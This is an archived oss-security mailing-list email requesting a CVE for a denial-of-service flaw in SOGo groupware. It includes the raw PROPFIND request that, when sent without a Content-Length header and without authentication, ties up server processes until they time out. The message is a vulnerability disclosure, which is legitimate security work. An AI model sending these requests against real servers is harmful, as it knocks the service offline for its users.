X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1165" "Tuesday" "7" "July" "2015" "13:53:21" "+0200" "Stefan Castille" "stefan.castille@bonnierdigital.se" "<559BBDB1.1030906@bonnierdigital.se>" "45" "[oss-security] CVE Request for sogO Open Source Groupware (www.sogo.nu)" nil nil nil "7" "2015070711:53:21" "[oss-security] CVE Request for sogO Open Source Groupware (www.sogo.nu)" (number mark "U       stefan.casti Jul  7   45/1165  " thread-indent "\"[oss-security] CVE Request for sogO Open Source Groupware (www.sogo.nu)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3333 invoked by uid 550); 7 Jul 2015 12:28:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11477 invoked from network); 7 Jul 2015 11:53:34 -0000
Message-ID: <559BBDB1.1030906@bonnierdigital.se>
Date: Tue, 7 Jul 2015 13:53:21 +0200
From: Stefan Castille <stefan.castille@bonnierdigital.se>
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Icedove/31.7.0
MIME-Version: 1.0
To: <oss-security@lists.openwall.com>
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 8bit
X-Originating-IP: [10.41.80.170]
X-ClientProxiedBy: EX11.bondom.bonnier.se (172.29.192.31) To
 EX11.bondom.bonnier.se (172.29.192.31)
Subject: [oss-security] CVE Request for sogO Open Source Groupware (www.sogo.nu)

Hej,

I would like to request a CVE for a DoS in sogo. While it does not crash
the system, it does make it very easy to conduct a DoS against the
application.


Software: sogo
Vendor: Inverse
Site: www.sogo.nu
Previously requested: No
Type: DoS
Description: Due to incorrect handling of certain PROPFIND requests, the
site is vulnerable to a DoS.

-----------------------------------
PROPFIND /SOGo/dav/ HTTP/1.1
Host: <hostname>
Connection: keep-alive
Content-Length: 0


------------------------------------

will return almost immediately

-----------------------------------
PROPFIND /SOGo/dav/ HTTP/1.1
Host: myhost
Connection: keep-alive


-----------------------------------
without the Content-Length will keep the child process occupied until it
times out. Default value one minute. With only <#processes> requests per
<timeout> the application can be rendered inaccessible.

No authentication/valid account is required. The bug has been reported
at www.sogo.nu/bugs as a private bugreport, but labelled won't fix as it
is 'how servers work' and that tuning the timeout will help. I disagree
and would like to get a CVE for it.


with kind regards,
Stefan
